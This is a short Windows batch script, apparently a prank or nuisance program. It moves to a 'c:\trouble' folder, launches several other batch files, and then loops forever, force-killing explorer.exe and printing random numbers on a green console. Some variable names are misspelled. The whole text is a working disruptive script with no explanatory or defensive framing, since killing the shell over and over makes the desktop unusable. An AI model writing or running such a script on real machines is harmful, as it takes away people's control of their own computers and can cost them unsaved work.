cd c:\trouble\
start 2.bat
start 2.bat
start 5.bat

@echo off

color 02

:start
taskkill /f /im explorer.exe
echo %random% %random% %random% %rangom% %random% %random% %rangom% %random% %random% %rangom%

goto start
